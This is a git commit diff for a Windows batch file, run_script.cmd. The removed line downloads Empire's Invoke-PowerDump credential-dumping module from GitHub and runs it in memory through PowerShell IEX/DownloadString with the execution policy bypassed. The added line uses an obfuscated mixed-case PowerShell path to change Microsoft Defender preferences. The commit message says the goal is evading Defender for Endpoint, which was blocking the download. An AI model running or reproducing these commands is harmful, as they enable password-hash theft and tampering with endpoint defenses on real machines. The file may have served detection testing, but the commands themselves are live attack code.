6f52c7b6219bc40916aad6115b72c59e7e79554f
Feathers <93973834+ionsor@users.noreply.github.com>
2025-02-19 12:47:27 +0100

    Update run_script.cmd
    changed powershell to modify defender hopefully to execute and just alert, downloadstring is blocked by MDE

--- run_script.cmd
+++ run_script.cmd
@@ -2,6 +2,6 @@
 REM This CMD script downloads and executes a remote PowerShell script in memory,
 REM then outputs a confirmation message after execution.
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/credentials/Invoke-PowerDump.ps1'); Write-Host 'PowerShell script executed successfully.'"
+c:\wIndoWs\SySWOw64\WindowSpowerSheLL\v1.0\poWershelL.EXE Set-MpPreference -DisableRemovableDriveScanning 0; Write-Host 'PowerShell script executed successfully.'"
 
 pause
